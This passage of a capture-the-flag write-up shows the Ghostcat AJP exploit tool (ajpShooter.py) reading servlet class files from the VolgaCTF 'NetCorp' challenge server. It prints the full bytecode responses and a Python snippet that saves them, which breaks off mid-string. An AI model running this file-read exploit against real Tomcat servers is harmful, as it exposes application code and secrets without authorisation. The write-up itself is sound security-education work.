root@m3ss4p0:~/Ghostcat-CNVD-2020-10487# python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /WEB-INF/classes/ru/volgactf/netcorp/ServeScreenshotServlet.class read

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/""4926-1585246402000""
[<] Last-Modified: Thu, 26 Mar 2020 18:13:22 GMT
[<] Content-Type: application/java
[<] Content-Length: 4926

b'\xca\xfe\xba\xbe\x00\x00\x004\x01\x1f\n\x00D\x00\x8e\t\x00\x8f\x00\x90\x08\x00\x91\n\x00\x92\x00\x93\x08\x00\x94\x08\x00\x95\x0b\x00\x96\x00\x97\x08\x00\x98\x0b\x00\x99\x00\x9a\x07\x00\x9b\n\x00\n\x00\x8e\n\x00\n\x00\x9c\x07\x00\x9d\x08\x00\x9e\n\x00\n\x00\x9f\x07\x00\xa0\n\x00\x10\x00\xa1\n\x00\x10\x00\xa2\n\x00\x10\x00\xa3\x08\x00\xa4\x0b\x00\x96\x00\xa5\x08\x00\xa6\n\x00\xa7\x00\xa8\x0b\x00\x96\x00\xa9\x0b\x00\xaa\x00\xab\x0b\x00\xac\x00\xad\x0b\x00\xac\x00\xae\x07\x00\xaf\n\x00\r\x00\xb0\n\x00\x10\x00\xb1\n\x00\r\x00\xb2\t\x00\x10\x00\xb3\x08\x00\xb4\x0b\x00\x1c\x00\xb5\x0b\x00\xb6\x00\xb7\x08\x00\xb8\x0b\x00\xb6\x00\xb9\x08\x00\xba\x0b\x00\xb6\x00\xbb\x08\x00\xbc\x07\x00\xbd\n\x00\xa7\x00\xbe\n\x00\xbf\x00\xc0\n\x00\xbf\x00\xc1\x08\x00\xc2\n\x00\xc3\x00\xc4\n\x00\xa7\x00\xc5\n\x00\xc3\x00\xc6\n\x00\xc3\x00\xc7\x07\x00\xc8\n\x002\x00\xc9\n\x002\x00\xca\n\x00\n\x00\xcb\n\x00\xa7\x00\xcc\x08\x00\xcd\x07\x00\xce\n\x008\x00\xcf\x08\x00\xd0\x0b\x00\x1c\x00\xd1\x08\x00\xd2\n\x00\xa7\x00\xd3\n\x00\xa7\x00\xd4\x08\x00\xd5\n\x00\xa7\x00\xd6\x08\x00\xd7\n\x00\xa7\x00\xd8\n\x00\xa7\x00\xd9\x07\x00\xda\x01\x00\x08SAVE_DIR\x01\x00\x12Ljava/lang/String;\x01\x00\rConstantValue\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x12LocalVariableTable\x01\x00\x04this\x01\x00,Lru/volgactf/netcorp/ServeScreenshotServlet;\x01\x00\x04init\x01\x00 (Ljavax/servlet/ServletConfig;)V\x01\x00\x06config\x01\x00\x1dLjavax/servlet/ServletConfig;\x01\x00\nExceptions\x07\x00\xdb\x01\x00\x07destroy\x01\x00\x06doPost\x01\x00R(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)V\x01\x00\x08fileName\x01\x00\x0ehashedFileName\x01\x00\x04path\x01\x00\x04part\x01\x00\x19Ljavax/servlet/http/Part;\x01\x00\x07request\x01\x00\'Ljavax/servlet/http/HttpServletRequest;\x01\x00\x08response\x01\x00(Ljavax/servlet/http/HttpServletResponse;\x01\x00\x07appPath\x01\x00\x08savePath\x01\x00\x0bfileSaveDir\x01\x00\x0eLjava/io/File;\x01\x00\x06submut\x01\x00\x03out\x01\x00\x15Ljava/io/PrintWriter;\x01\x00\rStackMapTable\x07\x00\xdc\x07\x00\xa0\x07\x00\xdd\x07\x00\x9d\x07\x00\xde\x07\x00\xdf\x07\x00\xaf\x07\x00\xe0\x01\x00\x10generateFileName\x01\x00&(Ljava/lang/String;)Ljava/lang/String;\x01\x00\x01i\x01\x00\x01I\x01\x00\x05count\x01\x00\x02md\x01\x00\x1dLjava/security/MessageDigest;\x01\x00\x06digest\x01\x00\x02[B\x01\x00\x02s2\x01\x00\x02sb\x01\x00\x19Ljava/lang/StringBuilder;\x01\x00\x01e\x01\x00(Ljava/security/NoSuchAlgorithmException;\x07\x00\xe1\x07\x00y\x07\x00\x9b\x07\x00\xce\x01\x00\x0fextractFileName\x01\x00-(Ljavax/servlet/http/Part;)Ljava/lang/String;\x01\x00\x01s\x01\x00\x0bcontentDisp\x01\x00\x05items\x01\x00\x13[Ljava/lang/String;\x07\x00\x88\x01\x00\nSourceFile\x01\x00\x1bServeScreenshotServlet.java\x01\x00\x19RuntimeVisibleAnnotations\x01\x00*Ljavax/servlet/annotation/MultipartConfig;\x0c\x00H\x00I\x07\x00\xe2\x0c\x00f\x00\xe3\x01\x00*ServeScreenshotServlet Constructor called!\x07\x00\xe4\x0c\x00\xe5\x00\xe6\x01\x00+ServeScreenshotServlet ""Init"" method called\x01\x00.ServeScreenshotServlet ""Destroy"" method called\x07\x00\xde\x0c\x00\xe7\x00\xe8\x01\x00\x00\x07\x00\xe9\x0c\x00\xea\x00r\x01\x00\x17java/lang/StringBuilder\x0c\x00\xeb\x00\xec\x01\x00*ru/volgactf/netcorp/ServeScreenshotServlet\x01\x00\x07uploads\x0c\x00\xed\x00\xee\x01\x00\x0cjava/io/File\x0c\x00H\x00\xe6\x0c\x00\xef\x00\xf0\x0c\x00\xf1\x00\xf0\x01\x00\x06submit\x0c\x00\xf2\x00r\x01\x00\x04true\x07\x00\xdc\x0c\x00\xf3\x00\xf4\x0c\x00\xf5\x00\xf6\x07\x00\xf7\x0c\x00\xf8\x00\xf9\x07\x00\xdd\x0c\x00\xfa\x00\xf0\x0c\x00\xfb\x00\xfc\x01\x00\x17javax/servlet/http/Part\x0c\x00\x83\x00\x84\x0c\x00\xfd\x00\xee\x0c\x00q\x00r\x0c\x00\xfe\x00F\x01\x00\x05Error\x0c\x00\xff\x00\xe6\x07\x00\xdf\x0c\x01\x00\x01\x01\x01\x00\x10application/json\x0c\x01\x02\x00\xe6\x01\x00\x05UTF-8\x0c\x01\x03\x00\xe6\x01\x00\x10{\'success\':\'%s\'}\x01\x00\x10java/lang/Object\x0c\x01\x04\x01\x05\x07\x01\x06\x0c\x01\x07\x00\xe6\x0c\x01\x08\x00I\x01\x00\x03MD5\x07\x00\xe1\x0c\x01\t\x01\n\x0c\x01\x0b\x01\x0c\x0c\x01\r\x01\x0e\x0c\x00x\x01\x0c\x01\x00\x14java/math/BigInteger\x0c\x00H\x01\x0f\x0c\x00\xed\x01\x10\x0c\x00H\x01\x11\x0c\x01\x12\x01\x13\x01\x00\x010\x01\x00&java/security/NoSuchAlgorithmException\x0c\x01\x14\x00I\x01\x00\x13content-disposition\x0c\x01\x15\x00r\x01\x00\x01;\x0c\x01\x16\x01\x17\x0c\x01\x18\x00\xee\x01\x00\x08filename\x0c\x01\x19\x01\x1a\x01\x00\x01=\x0c\x01\x1b\x01\x1c\x0c\x01\x1d\x01\x1e\x01\x00\x1ejavax/servlet/http/HttpServlet\x01\x00\x1ejavax/servlet/ServletException\x01\x00\x10java/lang/String\x01\x00\x12java/util/Iterator\x01\x00%javax/servlet/http/HttpServletRequest\x01\x00&javax/servlet/http/HttpServletResponse\x01\x00\x13java/io/IOException\x01\x00\x1bjava/security/MessageDigest\x01\x00\x10java/lang/System\x01\x00\x15Ljava/io/PrintStream;\x01\x00\x13java/io/PrintStream\x01\x00\x07println\x01\x00\x15(Ljava/lang/String;)V\x01\x00\x11getServletContext\x01\x00 ()Ljavax/servlet/ServletContext;\x01\x00\x1cjavax/servlet/ServletContext\x01\x00\x0bgetRealPath\x01\x00\x06append\x01\x00-(Ljava/lang/String;)Ljava/lang/StringBuilder;\x01\x00\x08toString\x01\x00\x14()Ljava/lang/String;\x01\x00\x06exists\x01\x00\x03()Z\x01\x00\x05mkdir\x01\x00\x0cgetParameter\x01\x00\x06equals\x01\x00\x15(Ljava/lang/Object;)Z\x01\x00\x08getParts\x01\x00\x18()Ljava/util/Collection;\x01\x00\x14java/util/Collection\x01\x00\x08iterator\x01\x00\x16()Ljava/util/Iterator;\x01\x00\x07hasNext\x01\x00\x04next\x01\x00\x14()Ljava/lang/Object;\x01\x00\x07getName\x01\x00\tseparator\x01\x00\x05write\x01\x00\tgetWriter\x01\x00\x17()Ljava/io/PrintWriter;\x01\x00\x0esetContentType\x01\x00\x14setCharacterEncoding\x01\x00\x06format\x01\x009(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;\x01\x00\x13java/io/PrintWriter\x01\x00\x05print\x01\x00\x05flush\x01\x00\x0bgetInstance\x01\x001(Ljava/lang/String;)Ljava/security/MessageDigest;\x01\x00\x08getBytes\x01\x00\x04()[B\x01\x00\x06update\x01\x00\x05([B)V\x01\x00\x06(I[B)V\x01\x00\x15(I)Ljava/lang/String;\x01\x00\x04(I)V\x01\x00\x06length\x01\x00\x03()I\x01\x00\x0fprintStackTrace\x01\x00\tgetHeader\x01\x00\x05split\x01\x00\'(Ljava/lang/String;)[Ljava/lang/String;\x01\x00\x04trim\x01\x00\nstartsWith\x01\x00\x15(Ljava/lang/String;)Z\x01\x00\x07indexOf\x01\x00\x15(Ljava/lang/String;)I\x01\x00\tsubstring\x01\x00\x16(II)Ljava/lang/String;\x00!\x00\r\x00D\x00\x00\x00\x01\x00\x1a\x00E\x00F\x00\x01\x00G\x00\x00\x00\x02\x00\x0e\x00\x06\x00\x01\x00H\x00I\x00\x01\x00J\x00\x00\x00?\x00\x02\x00\x01\x00\x00\x00\r*\xb7\x00\x01\xb2\x00\x02\x12\x03\xb6\x00\x04\xb1\x00\x00\x00\x02\x00K\x00\x00\x00\x0e\x00\x03\x00\x00\x00\x1a\x00\x04\x00\x1b\x00\x0c\x00\x1c\x00L\x00\x00\x00\x0c\x00\x01\x00\x00\x00\r\x00M\x00N\x00\x00\x00\x01\x00O\x00P\x00\x02\x00J\x00\x00\x00A\x00\x02\x00\x02\x00\x00\x00\t\xb2\x00\x02\x12\x05\xb6\x00\x04\xb1\x00\x00\x00\x02\x00K\x00\x00\x00\n\x00\x02\x00\x00\x00\x1f\x00\x08\x00 \x00L\x00\x00\x00\x16\x00\x02\x00\x00\x00\t\x00M\x00N\x00\x00\x00\x00\x00\t\x00Q\x00R\x00\x01\x00S\x00\x00\x00\x04\x00\x01\x00T\x00\x01\x00U\x00I\x00\x01\x00J\x00\x00\x007\x00\x02\x00\x01\x00\x00\x00\t\xb2\x00\x02\x12\x06\xb6\x00\x04\xb1\x00\x00\x00\x02\x00K\x00\x00\x00\n\x00\x02\x00\x00\x00$\x00\x08\x00%\x00L\x00\x00\x00\x0c\x00\x01\x00\x00\x00\t\x00M\x00N\x00\x00\x00\x04\x00V\x00W\x00\x02\x00J\x00\x00\x02O\x00\x06\x00\x0c\x00\x00\x00\xfc+\xb9\x00\x07\x01\x00\x12\x08\xb9\x00\t\x02\x00N\xbb\x00\nY\xb7\x00\x0b-\xb6\x00\x0c\x12\x0e\xb6\x00\x0c\xb6\x00\x0f:\x04\xbb\x00\x10Y\x19\x04\xb7\x00\x11:\x05\x19\x05\xb6\x00\x12\x9a\x00\t\x19\x05\xb6\x00\x13W+\x12\x14\xb9\x00\x15\x02\x00:\x06\x19\x06\xc6\x00\r\x19\x06\x12\x16\xb6\x00\x17\x9a\x00\x03+\xb9\x00\x18\x01\x00\xb9\x00\x19\x01\x00:\x07\x19\x07\xb9\x00\x1a\x01\x00\x99\x00b\x19\x07\xb9\x00\x1b\x01\x00\xc0\x00\x1c:\x08*\x19\x08\xb7\x00\x1d:\t\xbb\x00\x10Y\x19\t\xb7\x00\x11\xb6\x00\x1e:\t*\x19\t\xb7\x00\x1f:\n\xbb\x00\nY\xb7\x00\x0b\x19\x04\xb6\x00\x0c\xb2\x00 \xb6\x00\x0c\x19\n\xb6\x00\x0c\xb6\x00\x0f:\x0b\x19\x0b\x12!\xb6\x00\x17\x99\x00\x06\xa7\xff\xa6\x19\x08\x19\x0b\xb9\x00""\x02\x00\xa7\xff\x9a,\xb9\x00#\x01\x00:\x07,\x12$\xb9\x00%\x02\x00,\x12&\xb9\x00\'\x02\x00\x19\x07\x12(\x04\xbd\x00)Y\x03\x12\x16S\xb8\x00*\xb6\x00+\x19\x07\xb6\x00,\xb1\x00\x00\x00\x03\x00K\x00\x00\x00Z\x00\x16\x00\x00\x00+\x00\x0e\x00.\x00#\x000\x00.\x001\x006\x002\x00<\x004\x00F\x005\x00U\x008\x00x\x009\x00\x80\x00;\x00\x8e\x00<\x00\x96\x00=\x00\xb2\x00>\x00\xbc\x00?\x00\xbf\x00@\x00\xc8\x00A\x00\xcb\x00C\x00\xd3\x00D\x00\xdb\x00E\x00\xe3\x00F\x00\xf6\x00G\x00\xfb\x00H\x00L\x00\x00\x00z\x00\x0c\x00\x80\x00H\x00X\x00F\x00\t\x00\x96\x002\x00Y\x00F\x00\n\x00\xb2\x00\x16\x00Z\x00F\x00\x0b\x00x\x00P\x00[\x00\\\x00\x08\x00\x00\x00\xfc\x00M\x00N\x00\x00\x00\x00\x00\xfc\x00]\x00^\x00\x01\x00\x00\x00\xfc\x00_\x00`\x00\x02\x00\x0e\x00\xee\x00a\x00F\x00\x03\x00#\x00\xd9\x00b\x00F\x00\x04\x00.\x00\xce\x00c\x00d\x00\x05\x00F\x00\xb6\x00e\x00F\x00\x06\x00\xd3\x00)\x00f\x00g\x00\x07\x00h\x00\x00\x00a\x00\x05\xfe\x00<\x07\x00i\x07\x00i\x07\x00j\xfc\x00\x18\x07\x00i\xfc\x00\x0c\x07\x00k\xff\x00\\\x00\x0c\x07\x00l\x07\x00m\x07\x00n\x07\x00i\x07\x00i\x07\x00j\x07\x00i\x07\x00k\x07\x00o\x07\x00i\x07\x00i\x07\x00i\x00\x00\xff\x00\x0b\x00\x07\x07\x00l\x07\x00m\x07\x00n\x07\x00i\x07\x00i\x07\x00j\x07\x00i\x00\x00\x00S\x00\x00\x00\x06\x00\x02\x00T\x00p\x00\x02\x00q\x00r\x00\x01\x00J\x00\x00\x01G\x00\x04\x00\x08\x00\x00\x00c\x12-\xb8\x00.M,+\xb6\x00/\xb6\x000,\xb6\x001N\xbb\x002Y\x04-\xb7\x003\x10\x10\xb6\x004:\x04\xbb\x00\nY\x10 \xb7\x005:\x05\x036\x06\x10 \x19\x04\xb6\x006d6\x07\x15\x06\x15\x07\xa2\x00\x11\x19\x05\x127\xb6\x00\x0cW\x84\x06\x01\xa7\xff\xee\x19\x05\x19\x04\xb6\x00\x0c\xb6\x00\x0f\xb0M,\xb6\x009\x12!\xb0\x00\x01\x00\x00\x00Z\x00[\x008\x00\x03\x00K\x00\x00\x002\x00\x0c\x00\x00\x00L\x00\x06\x00M\x00\x0e\x00N\x00\x13\x00O\x00#\x00P\x00.\x00R\x00B\x00S\x00J\x00R\x00P\x00V\x00[\x00X\x00\\\x00Y\x00`\x00Z\x00L\x00\x00\x00\\\x00\t\x001\x00\x1f\x00s\x00t\x00\x06\x00;\x00\x15\x00u\x00t\x00\x07\x00\x06\x00U\x00v\x00w\x00\x02\x00\x13\x00H\x00x\x00y\x00\x03\x00#\x008\x00z\x00F\x00\x04\x00.\x00-\x00{\x00|\x00\x05\x00\\\x00\x07\x00}\x00~\x00\x02\x00\x00\x00c\x00M\x00N\x00\x00\x00\x00\x00c\x00X\x00F\x00\x01\x00h\x00\x00\x000\x00\x03\xff\x00;\x00\x08\x07\x00l\x07\x00i\x07\x00\x7f\x07\x00\x80\x07\x00i\x07\x00\x81\x01\x01\x00\x00\xf9\x00\x14\xff\x00\n\x00\x02\x07\x00l\x07\x00i\x00\x01\x07\x00\x82\x00\x02\x00\x83\x00\x84\x00\x01\x00J\x00\x00\x00\xe3\x00\x04\x00\x08\x00\x00\x00U+\x12:\xb9\x00;\x02\x00M,\x12<\xb6\x00=N-:\x04\x19\x04\xbe6\x05\x036\x06\x15\x06\x15\x05\xa2\x003\x19\x04\x15\x062:\x07\x19\x07\xb6\x00>\x12?\xb6\x00@\x99\x00\x19\x19\x07\x19\x07\x12A\xb6\x00B\x05`\x19\x07\xb6\x006\x04d\xb6\x00C\xb0\x84\x06\x01\xa7\xff\xcc\x12\x08\xb0\x00\x00\x00\x03\x00K\x00\x00\x00\x1e\x00\x07\x00\x00\x00_\x00\t\x00`\x00\x10\x00a\x00)\x00b\x006\x00c\x00L\x00a\x00R\x00f\x00L\x00\x00\x004\x00\x05\x00)\x00#\x00\x85\x00F\x00\x07\x00\x00\x00U\x00M\x00N\x00\x00\x00\x00\x00U\x00[\x00\\\x00\x01\x00\t\x00L\x00\x86\x00F\x00\x02\x00\x10\x00E\x00\x87\x00\x88\x00\x03\x00h\x00\x00\x00\x1e\x00\x03\xff\x00\x1b\x00\x07\x07\x00l\x07\x00o\x07\x00i\x07\x00\x89\x07\x00\x89\x01\x01\x00\x000\xf8\x00\x05\x00\x02\x00\x8a\x00\x00\x00\x02\x00\x8b\x00\x8c\x00\x00\x00\x06\x00\x01\x00\x8d\x00\x00'

root@m3ss4p0:~/Ghostcat-CNVD-2020-10487# python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /WEB-INF/classes/ru/volgactf/netcorp/ServeComplaintServlet.class read

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/""1559-1585246402000""
[<] Last-Modified: Thu, 26 Mar 2020 18:13:22 GMT
[<] Content-Type: application/java
[<] Content-Length: 1559

b'\xca\xfe\xba\xbe\x00\x00\x004\x00>\n\x00\x08\x00+\t\x00,\x00-\x08\x00.\n\x00/\x000\x08\x001\x08\x002\x07\x003\x07\x004\x01\x00\x10serialVersionUID\x01\x00\x01J\x01\x00\rConstantValue\x05\x00\x00\x00\x00\x00\x00\x00\x01\x01\x00\x08SAVE_DIR\x01\x00\x12Ljava/lang/String;\x08\x005\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x12LocalVariableTable\x01\x00\x04this\x01\x00+Lru/volgactf/netcorp/ServeComplaintServlet;\x01\x00\x04init\x01\x00 (Ljavax/servlet/ServletConfig;)V\x01\x00\x06config\x01\x00\x1dLjavax/servlet/ServletConfig;\x01\x00\nExceptions\x07\x006\x01\x00\x07destroy\x01\x00\x05doGet\x01\x00R(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)V\x01\x00\x07request\x01\x00\'Ljavax/servlet/http/HttpServletRequest;\x01\x00\x08response\x01\x00(Ljavax/servlet/http/HttpServletResponse;\x07\x007\x01\x00\x06doPost\x01\x00\nSourceFile\x01\x00\x1aServeComplaintServlet.java\x01\x00\x19RuntimeVisibleAnnotations\x01\x00*Ljavax/servlet/annotation/MultipartConfig;\x0c\x00\x11\x00\x12\x07\x008\x0c\x009\x00:\x01\x00*ServeScreenshotServlet Constructor called!\x07\x00;\x0c\x00<\x00=\x01\x00+ServeScreenshotServlet ""Init"" method called\x01\x00.ServeScreenshotServlet ""Destroy"" method called\x01\x00)ru/volgactf/netcorp/ServeComplaintServlet\x01\x00\x1ejavax/servlet/http/HttpServlet\x01\x00\x07uploads\x01\x00\x1ejavax/servlet/ServletException\x01\x00\x13java/io/IOException\x01\x00\x10java/lang/System\x01\x00\x03out\x01\x00\x15Ljava/io/PrintStream;\x01\x00\x13java/io/PrintStream\x01\x00\x07println\x01\x00\x15(Ljava/lang/String;)V\x00!\x00\x07\x00\x08\x00\x00\x00\x02\x00\x1a\x00\t\x00\n\x00\x01\x00\x0b\x00\x00\x00\x02\x00\x0c\x00\x1a\x00\x0e\x00\x0f\x00\x01\x00\x0b\x00\x00\x00\x02\x00\x10\x00\x05\x00\x01\x00\x11\x00\x12\x00\x01\x00\x13\x00\x00\x00?\x00\x02\x00\x01\x00\x00\x00\r*\xb7\x00\x01\xb2\x00\x02\x12\x03\xb6\x00\x04\xb1\x00\x00\x00\x02\x00\x14\x00\x00\x00\x0e\x00\x03\x00\x00\x00\x15\x00\x04\x00\x16\x00\x0c\x00\x17\x00\x15\x00\x00\x00\x0c\x00\x01\x00\x00\x00\r\x00\x16\x00\x17\x00\x00\x00\x01\x00\x18\x00\x19\x00\x02\x00\x13\x00\x00\x00A\x00\x02\x00\x02\x00\x00\x00\t\xb2\x00\x02\x12\x05\xb6\x00\x04\xb1\x00\x00\x00\x02\x00\x14\x00\x00\x00\n\x00\x02\x00\x00\x00\x1b\x00\x08\x00\x1c\x00\x15\x00\x00\x00\x16\x00\x02\x00\x00\x00\t\x00\x16\x00\x17\x00\x00\x00\x00\x00\t\x00\x1a\x00\x1b\x00\x01\x00\x1c\x00\x00\x00\x04\x00\x01\x00\x1d\x00\x01\x00\x1e\x00\x12\x00\x01\x00\x13\x00\x00\x007\x00\x02\x00\x01\x00\x00\x00\t\xb2\x00\x02\x12\x06\xb6\x00\x04\xb1\x00\x00\x00\x02\x00\x14\x00\x00\x00\n\x00\x02\x00\x00\x00 \x00\x08\x00!\x00\x15\x00\x00\x00\x0c\x00\x01\x00\x00\x00\t\x00\x16\x00\x17\x00\x00\x00\x04\x00\x1f\x00 \x00\x02\x00\x13\x00\x00\x00?\x00\x00\x00\x03\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x00\x14\x00\x00\x00\x06\x00\x01\x00\x00\x00\'\x00\x15\x00\x00\x00 \x00\x03\x00\x00\x00\x01\x00\x16\x00\x17\x00\x00\x00\x00\x00\x01\x00!\x00""\x00\x01\x00\x00\x00\x01\x00#\x00$\x00\x02\x00\x1c\x00\x00\x00\x06\x00\x02\x00\x1d\x00%\x00\x04\x00&\x00 \x00\x02\x00\x13\x00\x00\x00?\x00\x00\x00\x03\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x00\x14\x00\x00\x00\x06\x00\x01\x00\x00\x00,\x00\x15\x00\x00\x00 \x00\x03\x00\x00\x00\x01\x00\x16\x00\x17\x00\x00\x00\x00\x00\x01\x00!\x00""\x00\x01\x00\x00\x00\x01\x00#\x00$\x00\x02\x00\x1c\x00\x00\x00\x06\x00\x02\x00\x1d\x00%\x00\x02\x00\'\x00\x00\x00\x02\x00(\x00)\x00\x00\x00\x06\x00\x01\x00*\x00\x00'
```

I used the following [Python script](create_class_files.py) to recover the files, but the tool has a parameter to save read file.

```python
def create_class_file(filename, content):
    class_file = open(filename + "".class"", ""wb"")
    class_file.write(content)

create_class_file(""ServeScreenshotServlet"", b'\xca\xfe\xba\xbe\x00\x00\x004\x01\x1f\n\x00D\x00\x8e\t\x00\x8f\x00\x90\x08\x00\x91\n\x00\x92\x00\x93\x08\x00\x94\x08\x00\x95\x0b\x00\x96\x00\x97\x08\x00\x98\x0b\x00\x99\x00\x9a\x07\x00\x9b\n\x00\n\x00\x8e\n\x00\n\x00\x9c\x07\x00\x9d\x08\x00\x9e\n\x00\n\x00\x9f\x07\x00\xa0\n\x00\x10\x00\xa1\n\x00\x10\x00\xa2\n\x00\x10\x00\xa3\x08\x00\xa4\x0b\x00\x96\x00\xa5\x08\x00\xa6\n\x00\xa7\x00\xa8\x0b\x00\x96\x00\xa9\x0b\x00\xaa\x00\xab\x0b\x00\xac\x00\xad\x0b\x00\xac\x00\xae\x07\x00\xaf\n\x00\r\x00\xb0\n\x00\x10\x00\xb1\n\x00\r\x00\xb2\t\x00\x10\x00\xb3\x08\x00\xb4\x0b\x00\x1c\x00\xb5\x0b\x00\xb6\x00\xb7\x08\x00\xb8\x0b\x00\xb6\x00\xb9\x08\x00\xba\x0b\x00\xb6\x00\xbb\x08\x00\xbc\x07\x00\xbd\n\x00\xa7\x00\xbe\n\x00\xbf\x00\xc0\n\x00\xbf\x00\xc1\x08\x00\xc2\n\x00\xc3\x00\xc4\n\x00\xa7\x00\xc5\n\x00\xc3\x00\xc6\n\x00\xc3\x00\xc7\x07\x00\xc8\n\x002\x00\xc9\n\x002\x00\xca\n\x00\n\x00\xcb\n\x00\xa7\x00\xcc\x08\x00\xcd\x07\x00\xce\n\x008\x00\xcf\x08\x00\xd0\x0b\x00\x1c\x00\xd1\x08\x00\xd2\n\x00\xa7\x00\xd3\n\x00\xa7\x00\xd4\x08\x00\xd5\n\x00\xa7\x00\xd6\x08\x00\xd7\n\x00\xa7\x00\xd8\n\x00\xa7\x00\xd9\x07\x00\xda\x01\x00\x08SAVE_DIR\x01\x00\x12Ljava/lang/String;\x01\x00\rConstantValue\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x12LocalVariableTable\x01\x00\x04this\x01\x00,Lru/volgactf/netcorp/ServeScreenshotServlet;\x01\x00\x04init\x01\x00 (Ljavax/servlet/ServletConfig;)V\x01\x00\x06config\x01\x00\x1dLjavax/servlet/ServletConfig;\x01\x00\nExceptions\x07\x00\xdb\x01\x00\x07destroy\x01\x00\x06doPost\x01\x00R(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)V\x01\x00\x08fileName\x01\x00\x0ehashedFileName\x01\x00\x04path\x01\x00\x04part\x01\x00\x19Ljavax/servlet/http/Part;\x01\x00\x07request\x01\x00\'Ljavax/servlet/http/HttpServletRequest;\x01\x00\x08response\x01\x00(Ljavax/servlet/http/HttpServletResponse;\x01\x00\x07appPath\x01\x00\x08savePath\x01\x00\x0bfileSaveDir\x01\x00\x0eLjava/io/File;\x01\x00\x06submut\x01\x00\x03out\x01\x00\x15Ljava/io/PrintWriter;\x01\x00\rStackMapTable\x07\x00\xdc\x07\x00\xa0\x07\x00\xdd\x07\x00\x9d\x07\x00\xde\x07\x00\xdf\x07\x00\xaf\x07\x00\xe0\x01\x00\x10generateFileName\x01\x00&(Ljava/lang/String;)Ljava/lang/String;\x01\x00\x01i\x01\x00\x01I\x01\x00\x05count\x01\x00\x02md\x01\x00\x1dLjava/security/MessageDigest;\x01\x00\x06digest\x01\x00\x02[B\x01\x00\x02s2\x01\x00\x02sb\x01\x00\x19Ljava/lang/StringBuilder;\x01\x00\x01e\x01\x00(Ljava/security/NoSuchAlgorithmException;\x07\x00\xe1\x07\x00y\x07\x00\x9b\x07\x00\xce\x01\x00\x0fextractFileName\x01\x00-(Ljavax/servlet/http/Part;)Ljava/lang/String;\x01\x00\x01s\x01\x00\x0bcontentDisp\x01\x00\x05items\x01\x00\x13[Ljava/lang/String;\x07\x00\x88\x01\x00\nSourceFile\x01\x00\x1bServeScreenshotServlet.java\x01\x00\x19RuntimeVisibleAnnotations\x01\x00*Ljavax/servlet/annotation/MultipartConfig;\x0c\x00H\x00I\x07\x00\xe2\x0c\x00f\x00\xe3\x01\x00*ServeScreenshotServlet Constructor called!\x07\x00\xe4\x0c\x00\xe5\x00\xe6\x01\x00+ServeScreenshotServlet ""Init"" method called\x01\x00.ServeScreenshotServlet ""Destroy"" method called\x07\x00\xde\x0c\x00\xe7\x00\xe8\x01\x00\x00\x07\x00\xe9\x0c\x00\xea\x00r\x01\x00\x17java/lang/StringBuilder\x0c\x00\xeb\x00\xec\x01\x00*ru/volgactf/netcorp/ServeScreenshotServlet\x01\x00\x07uploads\x0c\x00\xed\x00\xee\x01\x00\x0cjava/io/File\x0c\x00H\x00\xe6\x0c\x00\xef\x00\xf0\x0c\x00\xf1\x00\xf0\x01\x00\x06submit\x0c\x00\xf2\x00r\x01\x00\x04true\x07\x00\xdc\x0c\x00\xf3\x00\xf4\x0c\x00\xf5\x00\xf6\x07\x00\xf7\x0c\x00\xf8\x00\xf9\x07\x00\xdd\x0c\x00\xfa\x00\xf0\x0c\x00\xfb\x00\xfc\x01\x00\x17javax/servlet/http/Part\x0c\x00\x83\x00\x84\x0c\x00\xfd\x00\xee\x0c\x00q\x00r\x0c\x00\xfe\x00F\x01\x00\x05Error\x0c\x00\xff\x00\xe6\x07\x00\xdf\x0c\x01\x00\x01\x01\x01\x00\x10application/json\x0c\x01\x02\x00\xe6\x01\x00\x05UTF-8\x0c\x01\x03\x00\xe6\x01\x00\x10{\'success\':\'%s\'}\x01\x00\x10java/lang/Object\x0c\x01\x04\x01\x05\x07\x01\x06\x0c\x01\x07\x00\xe6\x0c\x01\x08\x00I\x01\x00\x03MD5\x07\x00\xe1\x0c\x01\t\x01\n\x0c\x01\x0b\x01\x0c\x0c\x01\r\x01\x0e\x0c\x00x\x01\x0c\x01\x00\x14java/math/BigInteger\x0c\x00H\x01\x0f\x0c\x00\xed\x01\x10\x0c\x00H\x01\x11\x0c\x01\x12\x01\x13\x01\x00\x010\x01\x00&java/security/NoSuchAlgorithmException\x0c\x01\x14\x00I\x01\x00\x13content-disposition\x0c\x01\x15\x00r\x01\x00\x01;\x0c\x01\x16\x01\x17\x0c\x01\x18\x00\xee\x01\x00\x08filename\x0c\x01\x19\x01\x1a\x01\x00\x01=\x0c\x01\x1b\x01\x1c\x0c\x01\x1d\x01\x1e\x01\x00\x1ejavax/servlet/http/HttpServlet\x01\x00\x1ejavax/servlet/ServletException\x01\x00\x10java/lang/String\x01\x00\x12java/util/Iterator\x01\x00%javax/servlet/http/HttpServletRequest\x01\x00&javax/servlet/http/HttpServletResponse\x01\x00\x13java/io/IOException\x01\x00\x1bjava/security/MessageDigest\x01\